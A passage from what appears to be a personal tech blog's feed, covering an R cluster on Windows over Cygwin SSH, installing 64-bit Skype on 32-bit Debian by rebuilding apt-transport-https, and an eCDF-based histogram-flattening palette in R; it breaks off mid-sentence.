<p>Take the public part of your client key (<code>~/.ssh/win-cluster-key.pub</code> in my example) and place it to <code>/home/WinUserName/.ssh/authorized_keys</code> on the server. Start the <span class="caps">SSH </span>server by typing <code>/usr/sbin/sshd -f ~/sshd/sshd_config</code> on the server, then type <code>ssh win-cluster-node</code> on the client to verify that <span class="caps">SSH </span>connection works: you should get the same Cygwin prompt as in "Cygwin terminal".</p>

<p>Here comes the fun part: launching <code>Rscript</code> from such <span class="caps">SSH </span>connection is slightly complicated. If you just add <code>R.exe</code> to the <code>$PATH</code> and try to run <code>makeCluster(&quot;win-cluster-node&quot;)</code>, it will throw an error about empty <code>TMPDIR</code>.</p>

<p>Here is the shell script that fixes this problem:</p>



<pre>
<span style="color:#838183; font-style:italic">#!/bin/sh</span>
<span style="color:#838183; font-style:italic"># substitute your user name and path to R here</span>
<span style="color:#0057ae">export</span> TMPDIR<span style="color:#000000">=</span>C<span style="color:#000000">:/</span>Users<span style="color:#000000">/</span>WinUserName<span style="color:#000000">/</span>Temp
<span style="color:#0057ae">exec</span> cmd <span style="color:#000000">/</span>c C<span style="color:#000000">:/</span>Users<span style="color:#000000">/</span>WinUserName<span style="color:#000000">/</span>R-3.4<span style="color:#b07e00">.3</span><span style="color:#000000">/</span>bin<span style="color:#000000">/</span>Rscript.exe <span style="color:#bf0303">&quot;$&#64;&quot;</span> TMPDIR<span style="color:#000000">=</span><span style="color:#010181">$TMPDIR</span>
</pre>



<p>Place it to <code>/home/WinUserName/Rscript.sh</code> and make it executable using <code>chmod +x</code>.</p>

<p>All the puzzle pieces are in place now, let's start the cluster:</p>



<pre>
ncores <span style="color:#000000">&lt;- ...</span> <span style="color:#838183; font-style:italic"># how many worker processes to launch</span>
master <span style="color:#000000">&lt;- ...</span> <span style="color:#838183; font-style:italic"># address of client machine to connect back to</span>
cluster <span style="color:#000000">&lt;-</span> <span style="color:#010181">makePSOCKcluster</span><span style="color:#000000">(</span><span style="color:#010181">rep</span><span style="color:#000000">(</span><span style="color:#bf0303">&quot;win-cluster-node&quot;</span><span style="color:#000000">,</span>ncores<span style="color:#000000">),</span> master<span style="color:#000000">=</span>master<span style="color:#000000">,</span> user<span style="color:#000000">=</span><span style="color:#bf0303">&quot;WinUserName&quot;</span><span style="color:#000000">,</span> rscript<span style="color:#000000">=</span><span style="color:#bf0303">&quot;/home/WinUserName/Rscript.sh&quot;</span><span style="color:#000000">)</span>
</pre>



<p>Let's see if it works:</p>



<pre>
<span style="color:#000000">&gt;</span> <span style="color:#010181">parLapply</span><span style="color:#000000">(</span>cluster<span style="color:#000000">,</span> <span style="color:#b07e00">1</span><span style="color:#000000">:</span><span style="color:#010181">length</span><span style="color:#000000">(</span>cluster<span style="color:#000000">),</span> <span style="color:#000000; font-weight:bold">function</span><span style="color:#000000">(</span>i<span style="color:#000000">)</span> <span style="color:#010181">paste</span><span style="color:#000000">(</span><span style="color:#bf0303">&quot;node&quot;</span><span style="color:#000000">,</span>i<span style="color:#000000">,</span><span style="color:#010181">system</span><span style="color:#000000">(</span><span style="color:#bf0303">&quot;uname -a&quot;</span><span style="color:#000000">,</span> intern<span style="color:#000000">=</span><span style="color:#0057ae">T</span><span style="color:#000000">)))</span>
<span style="color:#000000">[[</span><span style="color:#b07e00">1</span><span style="color:#000000">]]</span>
<span style="color:#000000">[</span><span style="color:#b07e00">1</span><span style="color:#000000">]</span> <span style="color:#bf0303">&quot;node 1 CYGWIN_NT-6.1 WINSERVER 2.10.0(0.325/5/3) 2018-02-02 15:16 x86_64 Cygwin&quot;</span>

<span style="color:#000000">[[</span><span style="color:#b07e00">2</span><span style="color:#000000">]]</span>
<span style="color:#000000">[</span><span style="color:#b07e00">1</span><span style="color:#000000">]</span> <span style="color:#bf0303">&quot;node 2 CYGWIN_NT-6.1 WINSERVER 2.10.0(0.325/5/3) 2018-02-02 15:16 x86_64 Cygwin&quot;</span>

<span style="color:#000000">[[</span><span style="color:#b07e00">3</span><span style="color:#000000">]]</span>
<span style="color:#000000">[</span><span style="color:#b07e00">1</span><span style="color:#000000">]</span> <span style="color:#bf0303">&quot;node 3 CYGWIN_NT-6.1 WINSERVER 2.10.0(0.325/5/3) 2018-02-02 15:16 x86_64 Cygwin&quot;</span>
</pre>



<p>As a bonus, you are free to run most Unix-style shell commands, since the environment R is working in is Cygwin.</p>
				</div>
			</content>
		</entry>
<entry>
			<title>Installing Skype 8 for Linux on 32-bit Debian 9 (Stretch)</title>
			<link href="https://aitap.github.io/2018/07/31/skype.html" />
			<id>https://aitap.github.io/2018/07/31/skype.html</id> <!-- unique enough -->
			<updated>2018-07-31T00:00:00Z</updated>
			<content type="xhtml">
				<div xmlns="http://www.w3.org/1999/xhtml"><p>First things first, there are no miracles: you still need a 64-bit processor to run <code>skypeforlinux64.deb</code>. In fact, quite a lot of code we're going to install is going to be 64-bit, so let's get started:</p>



<pre>
<span style="color:#838183; font-style:italic"># Enable multiarch to allow installing non-i386 packages</span>
dpkg <span style="color:#000000">--</span>add-architecture amd64
apt update
<span style="color:#838183; font-style:italic"># Install the 64-bit kernel to run both 32-bit and 64-bit binaries</span>
apt <span style="color:#000000; font-weight:bold">install</span> linux-image-amd64
</pre>



<p>Now reboot into the new kernel (make sure of that in the bootloader menu). Make sure that everything works because we're going to use only <code>amd64</code> kernel from now on.</p>



<pre>
<span style="color:#838183; font-style:italic"># This part is optional, but doing this ensures that amd64 kernel is going to be default in GRUB menu</span>
apt purge linux-<span style="color:#000000">{</span>image<span style="color:#000000">,</span>headers<span style="color:#000000">}*</span><span style="color:#b07e00">686</span><span style="color:#000000">-</span>pae
apt <span style="color:#000000">--</span>purge autoremove
</pre>



<p>Now we can just install the 64-bit package, right?</p>



<pre>
<span style="color:#838183; font-style:italic"># Commented-out code may break your system</span>
<span style="color:#838183; font-style:italic"># dpkg -i .../path/to/skypeforlinux64.deb</span>
<span style="color:#838183; font-style:italic"># apt-get install -f</span>
</pre>



<p>If you run the above commands, you'll find out that <code>apt</code> suggests you to wipe half of the package management system (but has enough courtesy to warn you that it may not be the right thing to do, so can you please type that you know what you are doing first?)</p>

<p>What the hell?</p>

<ol>
<li><code>skypeforlinux</code> depends on <code>apt-transport-https</code>.</li>
<li><code>apt-transport-https</code> does <strong>not</strong> have <code>Multi-Arch</code> field in its description. Therefore, it gets pre-multiarch behaviour,</li>
</ol>

<blockquote><p>The package is not co-installable and it must not be used to satisfy the dependency of any package of another architecture than its own.</p></blockquote>

<ol start="3">

<li><code>skypeforlinux:amd64</code> tries to pull <code>apt-transport-https:amd64</code>, which conflicts with <code>apt-transport-https:i386</code> and the rest of <span class="caps">APT.</span></li>
<li>Hillarity ensures.</li>

</ol>

<p>But that's nonsense, you'd say. (At least, I would.) <code>apt-trasport-https</code> provides, basically, a single executable, <code>/usr/lib/apt/methods/https</code>, which can be called by 32-bit <span class="caps">APT </span>to download whatever <span class="caps">APT </span>wants to download via <span class="caps">HTTPS.</span> There is no reason for it to be a 64-bit executable on a (mostly) 32-bit system. Can we ask <span class="caps">APT </span>to keep the 32-bit version?</p>

<p>Almost.</p>

<p>The <a href="https://wiki.ubuntu.com/MultiarchSpec">Multiarch specification</a> says:</p>

<blockquote><p>If a package is declared <code>Multi-Arch: foreign</code>, preference should be given to a package for the native architecture if available; if it is not available, the package manager may automatically install any available package, regardless of architecture, or it may choose to make this an option controlled by user configuration. <br /><br />
The package is not co-installable and <em>should be allowed to satisfy the dependencies of a package of another architecture than its own</em>.</p></blockquote>

<p>If you feel your tinker-fu high today, you can try to:</p>

<ol>
<li>Take the original <code>apt-transport-https_VERSION_i386.deb</code></li>
<li>Use <code>ar</code> to extract <code>control.tar.gz</code></li>
<li>Extract <code>./control</code> from <code>control.tar.gz</code></li>
<li>Patch in the missing line and increment the version while you're at it</li>
<li>Try to fit the guts back before abyone notices</li>
<li>Install the resulting package</li>
</ol>

<p>Perhaps it even could work. But we're building our own version of <code>apt-transport-https</code> from source, just for the sake of one line in the package description. Silly, I know.</p>



<pre>
<span style="color:#838183; font-style:italic"># Install the packages required to build APT and then some</span>
apt-get build-dep apt devscripts
<span style="color:#838183; font-style:italic"># Create an empty directory to work in</span>
<span style="color:#0057ae">cd</span> $<span style="color:#000000">(</span>mktemp <span style="color:#000000">-</span>d .<span style="color:#000000">/</span>apt-XXX<span style="color:#000000">)</span>
<span style="color:#838183; font-style:italic"># Download the apt source code</span>
apt-get <span style="color:#0057ae">source</span> apt <span style="color:#838183; font-style:italic"># I wanted to sneak a GEB reference here, but, well, here it is</span>
<span style="color:#838183; font-style:italic"># Change directory to the source code itself</span>
<span style="color:#0057ae">cd</span> apt-<span style="color:#000000">*</span>
<span style="color:#838183; font-style:italic"># Insert the missing line in the description of apt-transport-https</span>
<span style="color:#000000; font-weight:bold">sed</span> <span style="color:#000000">-</span>i <span style="color:#bf0303">'/^Package: apt-transport-https$/aMulti-Arch: foreign'</span> debian<span style="color:#000000">/</span>control
<span style="color:#838183; font-style:italic"># Increment the version in the changelog so that the original from the repo</span>
<span style="color:#838183; font-style:italic"># wouldn't override the locally patched package next time you run apt upgrade</span>
dch <span style="color:#000000">--</span><span style="color:#0057ae">local</span><span style="color:#000000">=</span><span style="color:#bf0303">'multiarch'</span> <span style="color:#bf0303">&quot;Mark the package as multi-arch foreign to satisfy skype dependencies&quot;</span>
<span style="color:#838183; font-style:italic"># dch will warn you that the current directory has been renamed,</span>
<span style="color:#838183; font-style:italic"># so let's change into it to avoid confusion</span>
<span style="color:#0057ae">cd</span> ..<span style="color:#000000">/</span>apt-<span style="color:#000000">*</span>
<span style="color:#838183; font-style:italic"># Build the packages. ALL OF THEM!</span>
dpkg-buildpackage <span style="color:#000000">-</span>uc <span style="color:#000000">-</span>us
</pre>



<p>Go grab a cup of coffee. (Or, preferrably, something without any caffeine, because your pulse must be racing from stress at this point.) <span class="caps">APT </span>is written in C++ and contains a lot of translation strings, so don't expect the build process to be done instantaneously.</p>

<p>Is it done yet? On my machine the build process additionally warned about some translations not being good enough and then crashed because of missing <code>usr/share/man/*/*/apt-something-something.*</code>. Notice the double <code>*/*/</code>: those must have been the translated man pages. I had to remove the offending lines from <code>debian/*.install</code>. It's not like I'm even going to install those packages: I just need the patched <code>apt-transport-https</code>. After I applied the fix, I ran <code>fakeroot debian/rules binary</code> to restart the process from approximately where it stopped at.</p>

<p>Is it done now? Finally, you can install the multi-arch-aware <code>apt-transport-https</code>:</p>



<pre>
dpkg <span style="color:#000000">-</span>i ..<span style="color:#000000">/</span>apt-transport-https<span style="color:#000000">*</span>.deb
</pre>



<p>Then install Skype and its dependencies:</p>



<pre>
dpkg <span style="color:#000000">-</span>i ...<span style="color:#000000">/</span>path<span style="color:#000000">/</span>to<span style="color:#000000">/</span>skypeforlinux64.deb
apt-get <span style="color:#000000; font-weight:bold">install</span> <span style="color:#000000">-</span>f
</pre>



<p>Assuming that our <code>apt-transport-https</code> is patched properly, installing Skype now should <strong>not</strong> break the system.</p>

<p>Enjoy your calls! Until the next <span class="caps">APT </span>update, that is...</p>
				</div>
			</content>
		</entry>
<entry>
			<title>Histogram flattening palette in R</title>
			<link href="https://aitap.github.io/2018/07/21/flathist.html" />
			<id>https://aitap.github.io/2018/07/21/flathist.html</id> <!-- unique enough -->
			<updated>2018-07-21T00:00:00Z</updated>
			<content type="xhtml">
				<div xmlns="http://www.w3.org/1999/xhtml"><p>If you've ever done digital photo processing, you've probably used the <a href="https://docs.gimp.org/en/gimp-tool-curves.html">Curves</a> tool that provides an intuitive way to enhance contrast in some brightness ranges by scarificing it in other ranges. Basically, the steeper the curve is, the more contrast will increase. But resulting brightness range has to stay the same, so if you increase the slope anywhere, you then have to decrease it somewhere else (or cut off some brightness values, making them insidtinguishable).</p>

<p>Let's take a look at this nice picture and try applying different sigmoidal transforms to it:</p>

<p><img src="moscow.png" alt="" class="center" /></p>

<p>We can highlight the details of the clouds by blacking out everything else, look at the houses by sacrificing darker and brighter parts of the picture, or just white everything out for no visible profit. The reason for different midpoints of our sigmoidal transformation function highlighting different amounts of details is that some intensities are more present on the image than others:</p>

<p><img src="mow_hist.svg" alt="" class="center" /></p>

<p>Which is why it's useful to white out everything after the peak corresponding to "white" color if you are working with badly produced scans (or, worse, photos) of paper documents:</p>

<p><img src="paper.png" alt="" class="center" /></p>

<p>Let's assume that we are working with single-channel/false-color images (so, no <span class="caps">RGB </span>or anything, just a single matrix of intensity values) and want to highlight the variance in brightness ranges which are occupied by most pixels (i.e. where are peaks of the histogram) at the expense of less populated signal levels (i.e. where histogram/density/frequency value is lower)<sup class="footnote"><a href="#fn1">1</a></sup>. The brightness transformation function should have the steepest jumps where there are the steepest jumps on the histogram, i.e. we just need to compute cumulative sum of the histogram to generate our transfromation function.</p>

<p>In fact, there's a simpler way to express that transformation, and it's <a href="https://en.wikipedia.org/wiki/ECDF">empirical cumulative distribution function</a>. Like <img src="data:image/gif;base64,R0lGODdhmAAUAPMAAP///9XV1crKyr+/v7W1tampqZKSkm5ubmFhYVRUVEZGRjg4OCgoKAAAAAAAAAAAACwAAAAAmAAUAAAE/xDISau9OOvQcAtaKFrcaGrfqa4hB14uK8dTJ4v0JTQ8T9i8RKLHOwgowWFvOMrBUjeTE2Az7U5TgODQOEp2CMpiQRkgEN7JeDIQjrqia/SdBnAQvdAOaq1ODmgWfjwVAggHFYRscBt8GVlzFTkcdRl7lU2OAw0DF4N+EpudNVUdcpagGYyRGKdUmBaXUasACAlvqQAJYTVkEkCFq7QcBz88L643PJvHv3WcjbSPDcU9yJ+4noMMPbzBeDUUHAVDR6egROl5wQbQm78VBHjrSAVSDeRw50i5grmKv3xR8VdpEAhogiI1kIcI3kAKgEY9kebpoEQkFGxl88cvXKKLDujFOfKoUCKwCTtgBaNIYmRIAKI8dawwQIE3Kv1+gXwo8kUiVjTkDFKpgwdROy55SgBUyRXAL2ee5YRJT2mNIyVI/lKX7sImL4wGsdjjUxBWsRS2rNpRdg2bqBXcPsEUVsCOW2xRTjURkerVGjtHJOtyVwufZF/S+UySzgg/IU//xrLBYSEXRyxV7ChgTS+po1h8XC6bmdUbDJAkJVWRtaVPWaZRr44dAqHZOHsF55S2h/Zk3yyMPinrOtLmacQ5a+Oae0Jq4BrIFh/OqsE85Ftnz3kOPYTylh6Id3fevLr48SKaoV/PHkAEADsAAAAAAAAAAAA=" />, its <a href="https://en.wikipedia.org/wiki/Cumulative_distribution_function">probability-theoretical counterpart</a>, eCDF calculates the fraction of points in the dataset that are less than given value:</p>

<p class="center"><img src="data:image/gif;base64,R0lGODdhGAE/APMAAP///9XV1crKyr+/v7W1tampqW5ubmFhYVRUVEZGRjg4OCgoKBgYGAAAAAAAAAAAACwAAAAAGAE/AAAE/xDISau9OOvNu/9gKG5B0wiAYDbB6L5wLM90bd9WMwwHcgKDBm5ILBqPyKRECEAgUEuldEqtWmvC4GCiunq/4HDVYKD8xOi0ev1RbSUltnxOR5daki6zzu/7cV0TOkF/hYaHIGdLBYqIjo9UhDB7cCaQl5hFKwkImZ6ffAqUFw0+pSuoqaompiYHUKCxshWWG6INCiM8uAwNDAezwbO1Gge9Cm+6Bwq9ws6fxBkCCAwMTzADCAnJz90YcR0sU9HS1NawIwIHZd4cKqhQgYd3HvRK5BkDor8xKujtFQQYUPSOgBMzrFqhMvBPUMJVPmj4AzExCb4MxnBxGwHuwi5n6v9eWVCxYJQEBbkqDBjYkAJKC9k6zSAjgqZFk+WqXcNRokFJYSFbnsR5MUWpDBe1yFB6QZ5KHTdB6PMFDMcPUcIObCsmkxZOQRsdYrAJowfGrhYQVD1SFOOxsFi+YhqQYC0GSV41kM3rUe4HtUjlmkXykqK5nVb9QtIKlxYpv0z5CpqMDSqGwn0bz1jhpG3Tw0JjeK7T0wQesS5GA85BCa+MwV4TLEiw4sJqOVP5Jb7iNIcGNxKCoButYfRFXBNixs2AGcPxVdAVx8iIbDeVd6dJSVtH4TYA4oE3HC+54ieNtsalj4gOngvoG+0lmghN+cKyClhRr1d8PCWQg+fJlR7/H7nZtZl6M7xDnxlIkccZJfGxJh5RrX3FHiqSqVTXhH1Qp9l+GvQkwDsRGtWIcw8R5R8GjHFAoQZ0GbjEKAiG81WLxdUIgogmiiPCNAyYF2AGJQiw0hk1KhiCX6PF6OJjeokkIRFFEVeiB4P08INrUnGy4JICogDckgcUsF4xW6H5YW8z5mPZlB+UJqYJDGWIUCUoPnYhhr41gZiOFEQ2pHN5AJoHSyGwSYE67OC56AFSWmCPnclxl2ecW2qJwoYUwMbXiRN4hwUQbyrqjqU2WPmlNPN9AGpAlqmQXR6QNjQpfisGN1Cdl+UqHiwatRnom50mQOpdxN6w16sbBIVD/3MX3Eooq8w6xkFpPo6EKBfZOlSKQisY0BhnrYSTHKcZiHqoaSyidcOYAHTURq2ppvjVpIZyW20U8eY7kiqzioHjWS6oW8OkeoBgQKRWnGFqG61Ou68sxAnqgcU2ODVIkhMP8YMK4hoVcDpVHgvQdxCO1egHe1k1HCOr9jsyEnKSODN87IJESX5GYVCRBz97XEFP9XQ7R84nbyaTCgkYKzKRRkN9cxhBuyAvIA0wkrREA813JNLfIBh1GozKUDV8Rvq79dqnMpwOgGzFzPbcHiws910ILCAj1iheSPff3N4N0zIMVMfWAA8DrrjPWbuwCzO1IZF1x4tXPs0Ct+ypCnjkK+h2BNGVh14cuJqz57boqKeu+uqusu7667DHjpvasteuiQmc2K77Gjzv7vsXV/4ee09TvxC88K9vrOee4SHvvGOJG0/786gLQbkIx1O/+tgyZK896tFL/z31P0wP5fjOC8Fm6QKajz7gkxc/ArTv6w529ylmEgEAOwAAAAAAAAAAAA==" /></p>

<p><img src="inthist.svg" alt="" class="center" /></p>

<p>It can also be shown that the result of taking cumulative distribution function of a variate is uniformly distributed, i.e. has flat histogram, which is <a href="https://en.wikipedia.org/wiki/Histogram_equalization">how this technique is remembered everywhere</a>. So, just by plotting <img src="data:image/gif;base64,R0lGODdhUAATAPMAAP///9XV1crKyr+/v7W1tampqW5ubmFhYVRUVEZGRjg4OCgoKAAAAAAAAAAAAAAAACwAAAAAUAATAAAE/xDISau9OGscGGbBJo5kKXXhhZoC47qEB7gI8rqGMNH2a5erTHAjMDB0ktaBolBQBocDUtKcDGqlo6g1MkgtMomrIjgYKGOrVjQUgjYDxuASntUl8bk47OFu7xlrJy8pBwgjaRUIS2JOYo8iggAdBjEuKX6TWnF7iIB2OwsvjCR1HQU2Opl8BTudkZ+JDI4zJnVvcnQTBzcyhp50fHy2Fm2ukBV5ujuAAwmkiSa1FcbIkhNeU0m3d2Vfr4EMvLJ0Oh1oEx2qYUWCLSlUtABQ3/EaXDJ8SEcth+8TmTRdItMLHo9eOZjViIYmBCA/HRgQMPJmhzZpGIlRq6ihWsaPGiViXbwQEKTJCvwYIChwx2M6jidjDpJoBN5LmxRcytzJ4dMMnBEAADsAAAAAAAAAAAA=" /> instead of <img src="data:image/gif;base64,R0lGODdhEAAIAPMAAP///9XV1crKyr+/v7W1tampqW5ublRUVAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAAEAAIAAAEJxBIGZAhKIfJazmIAAgINyEbMpgshbZstcFmCFRtSB7jG2cEg8YUAQA7AAAAAAAAAAAA" />, you already highlight the differences in mostly populated intensity ranges and enhance the contrast. If you do that to a photograph, the result would probably look weird (because you're now plotting quantiles instead of intensity values as perceived by the camera), but most scientific pictures already look weird even before you apply false colors, so that should not be an issue.</p>

<p><img src="mow_flat.png" alt="" class="center" /></p>

<p>But what if you had an R palette and wanted to feed your original data to a plotting function in R and make the histogram-flattening transform by applying a special kind of palette produced from the original you had?</p>

<p>R palettes are just vectors of colours (strings of hex codes, like <code>&quot;#00FF00&quot;</code> or <code>&quot;#FF4900FF&quot;</code> or colour names, like <code>&quot;palevioletred3&quot;</code> or <code>&quot;lightgoldenrodyellow&quot;</code>). If you plot a continuous numeric variable, R assumes that the palette uniformly covers the entire range of the colour-described variable<sup class="footnote"><a href="#fn2">2</a></sup> and assigns the colour that would be the closest on that grid. There are built-in functions that generate nice-looking continuous palettes of specified sizes: <code>heat.colors</code>, <code>topo.colors</code>, <code>terrain.colors</code>, <code>rainbow</code>, <code>grey.colors</code>, <code>cm.colors</code>. Some packages also follow this pattern, like <code>cubeHelix</code> from <a href="https://cran.r-project.org/web/packages/rje/index.html">rje</a> package:</p>

<p><img src="palettes.svg" alt="" class="center" /></p>

<p>If you have a set of colors and want to have a continuous palette produced from them for you automatically, there is <code>colorRampPalette</code> function that takes a vector of colors and returns a palette-function (like ones described above):</p>

<p><img src="color_ramp_palette.svg" alt="" class="center" /></p>

<p>We will also follow the palette-function pattern, which means that the function we are going to write will both accept and return a function. Functional programming <span class="caps">FTW</span>!</p>

<p>The problem with <span class="caps">CDF </span>is that it's right-continious and constant between discontiniuities. So, unlike <img src="data:image/gif;base64,R0lGODdhWAAWAPMAAP///9XV1crKyr+/v7W1tampqW5ubmFhYVRUVEZGRjg4OCgoKAAAAAAAAAAAAAAAACwAAAAAWAAWAAAE/xDISau9OGsb2M5M8I1kmXWiOaGjwLwv4QEvgsCvIUz1Dd8klooixAgMjJ3EdaAoFJTB4aCUPCcDGyk5tLg0BqplJnlVBAcDxYzlbopdCTzKGFzINLxkUOeRPV8bgXFrOx0vKQcII2wVCE1lUGWTAB0GMohlVUQMlzApGS4dO3xlehiNa38LMJByDAU3O4GnlbCyAIMgsDymjLWNDJI0ayJ9FcDGdiUMBzgzir93f38cIWMn18y1fMvIqhYDCa6p1qC9GHNrY24VYZu5eOVoYr4aXB3oqIa1ZyFcg460E+VkGAAp9awY5CHAxSKCmpA1ZPBQm4YvhywueQaqxzMdfkpslDtEAIlGXbYYlMz0oR2hlx/UDZEJs6ZEE4fOobTJk9O5DSplrNDYs+irnyBoKKFplGc+EqXKIG1KdYu3qliHwOqXtWu6chIiAAA7AAAAAAAAAAAA" />, which is always different for different <img src="data:image/gif;base64,R0lGODdhEAAQAPMAAP///9XV1crKyr+/v7W1tampqW5ublRUVAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAAEAAQAAAEPRCAgAxBOMgtaTmIAAgItyEaMphsh7YspcHlKVJtSB7jG2MEQwZGLBIpviKCcDECSiEnYFBzqqTPQrWIjAAAOwAAAAAAAAAAAA==" /> taken from original dataset, we probably will get non-unique values if we evaluate eCDF on a uniform grid:</p>

<p><img src="ecdf_uniform.svg" alt="" class="center" /></p>

<p>Same colours in a continuous palette (or, actually, any kind of palette) are a bad thing: they make different values non-distinguishable even if they got assigned to different colours in the palette. (In the end, we are still going to get non-distinguishable colors in value ranges far from histogram peaks - because we're interested in distinguishing densely-populated ranges - but we have to try, at least.) Moreover, the more points we request on that linear grid, the more repeats we'll get; and we are <strong>bound</strong> to get some non-uniques if the number of points in the grid exceeds the number of points in the dataset.</p>

<p>What to do? eCDF is just an estimate of the original <span class="caps">CDF </span>of the distrubition your points were sampled from. And your original distribution is hopefully continuous. So let's replace some of the repeats with interpolated values, so that all values are unique again:</p>

<p><img src="ecdf_uniform2.svg" alt="" class="center" /></p>

<p>We could probably try to get a smooth curve instead of linear interpolation, but splines are not guaranteed to be non-decreasing, so let's keep it simple. Now that we have a number of unique points in <img src="data:image/gif;base64,R0lGODdhIAATAPIAAP///9XV1crKyr+/v2FhYVRUVAAAAAAAACwAAAAAIAATAAADZQhqbPowwuZilTiD+3hoQTZwm3R9AiAYoWUQltmlypqRZLnEGC7vkwXHx9N1hMGkkvg7FplF4DKqlDo3NFXOaryitC1GtWv9MFoAQkFIEHPJmJEGvm327BmbJlefoO8ubnMmDQ8JADsAAAAAAAAAAAA=" /> range, let's call the original palette function and take colours at corresponding indices.</p>

<p>But how many colours should we request from the original palette function? If we don't request enough, our calculated indices will be repeated and our new palette will produce same colours for different values. In a perfect world consisting of purely Platonic ideas of <img src="data:image/gif;base64,R0lGODdhEAAMAPIAAP///93d3dXV1crKyr+/v2FhYQAAAAAAACwAAAAAEAAMAAADMwhqVsxCSWlAVcPEuezMXHdh41SN2cZVTqOF4kLAYmQMtGcEgPDCpw0IaMEtjCvGxDdJAAA7AAAAAAAAAAAA" />eal numbers, there's one trick that would give us the exact number of colors we should request so that all indices recomputed from <img src="data:image/gif;base64,R0lGODdhcAATAPMAAP///93d3dXV1crKyr+/v7W1tampqW5ubmFhYVRUVAAAAAAAAAAAAAAAAAAAAAAAACwAAAAAcAATAAAE/xDISau9OOvNqfpKV4GhaJ5oOqorK34IKbh0KQngfBG21NOZkG2g0Hl+QIsNNwAQjRNYi4YjrXpEJRJVBU0VTUn28tuemEEA9jdAIMIqNMZWnk8tuEMhV8FBlWoTTyMEPBd5ex9/fhp0LR8edxQ4BglgTmVwdjEKMX9jl5MKlZdjUZpkUY89dWQzCgRpG0I+sSNhpj6vtqmzqpG9vxiMGJwkdUVqqLmhon8UxlbAgdOSZjfJdr4KAQDEPpq52M/CstTl1edzTThKqIDZpuLK7t5Izdr0Ymatt0QJmJ59S9UsFL594P4FxJMtH5pBalhJwqagwAFFww4e6dFOHbAqFjUxHtJYrosRBAAjckIX51gSF10gpdtxzePLmzhZBtuZs+fLmgjN+Rxag0NDnkSTnpC21MuECAA7AAAAAAAAAAAA" /> to <img src="data:image/gif;base64,R0lGODdhcAATAPMAAP///93d3dXV1crKyr+/v6mpqZ6enmFhYVRUVEZGRjg4OCgoKBgYGAAAAAAAAAAAACwAAAAAcAATAAAE/xDISau9OOtdm29ceH1gJ54oUKJr6rbu1Axj/FoEbHmIR3kH389WCQp2Ox1RAgNyCgmGgkApKJUXAalp0HmxGi3JhNw0CojF4Ucrb7TtWoM6pAwOh3gInrm+QQQKUxJaR24ehhSFGiBGdTIEOUmJE4t9NTIwiwdqhA2UMhIDZ156claJLaNMeqNWO6ZujyowqwCBg7ZlM5JkjCoAli0zosMDvbMYfoxxnGvEmKwWQVtNKgHBn8DFbB2x1Fu+yRWWt4IqsUwTuuNIDdgAqyvQ3OvLv7IW5QCcCwiXTAiwQ2dGRaou9boFHEhPWbQLAwMxWOOQiRVT+9zF0UKxYUJSGFC1ARQn5NaZaQnoRBOTxeOPkvWwrGCpz2Wol9QkHPhHK6cdMNs4iPmwJMZQmEEzICMCtKjTE03VFY36tOrIDANjULXKtV0HUFq7ig0xZuyYCAA7AAAAAAAAAAAA" /> would be different: <img src="data:image/gif;base64,R0lGODdhcAAnAPMAAP///93d3dXV1crKyr+/v7W1tampqW5ubmFhYVRUVEZGRgAAAAAAAAAAAAAAAAAAACwAAAAAcAAnAAAE/xDISau9OGeytP9gKI4ksCxIqa5s63VuLM8fTN+4bOd8L+6+1WkY/BV/QxjwWGOSlE5jNASdNq3XJXZyQpy2mSp4/JRoyWiMmJtsu9/wuHxOr8st67T+kt/7zYBCZxSDf4R4gSpfL4ZXhyZFhY2QFX04ko1LljeYhpqJXAcFQwMDQwJsXF4nqKBdRC2vizGflBUJCwMABAe5uzvAEhxcE6aUnRnGmyW1WgsEXNCujwILrTbWtmp3ZqjIUo/Oj9PEAAELAaDq5WV8Qohh49rBANXX8DPfGMPsVNIm/55FG2hKmpJSCxIY0IcHocJOmlDIq+HFTEUTF1EoyVil2oICvVlarfAIMpujShOnYLI3gyU+lP3yUamxMF/Nl/IYcvpgSpeMnmxOKEiScwzEf7SQxuyn00qCFDOeupuawyWNWbTEVdLY9MXNSRq6sgAK1pPSsmmkovWDdS2NCAA7AAAAAAAAAAAA" />. Except when <img src="data:image/gif;base64,R0lGODdhaAAbAPMAAP///9XV1crKyr+/v7W1tampqW5ubmFhYVRUVEZGRgAAAAAAAAAAAAAAAAAAAAAAACwAAAAAaAAbAAAE/xDISau9UuHNu/+bBipiV4Joql6n2WLvKs8hXdt4nulVzP8en00ILFpIBgJJIRAsAxNSNPmMUgIKKglqw2oV3J8GwQQMDOXB6UQWmEslbKENcHYV87IdqFEMon87VoCDAHBQfjxghoFGho+FkIKTki1YYRxLmksVl447axShkXCdizArnqhDkq2jlKU9bliKs0Qfaj2MhBmNib28IkxOCHWnM8MKxU6YmSwKBz3QwgfU1hnV2MISWAoEaMcz3d9bKEIttzLpn0E3kSYjIN3Nd+HvorpF64YESmL9Mc7l4xOvjCJDbgxpSrAJn0OCIHIBkXjEHSV2IRop0viwoop5Rivw7BtRIKDFEQCNdAOy0qO0aiMfGcRIMyYumzRzjuCos+eQkj6D1hNKtEIEADsAAAAAAAAAAAA=" /> is so small that requested amount of colors would start having troubles fitting into computer <span class="caps">RAM, </span>the difference would be impossible to perceive with human eye and impossible to express in 24-bit <span class="caps">RGB </span>in the first place. But even if we limit ourselveswith <img 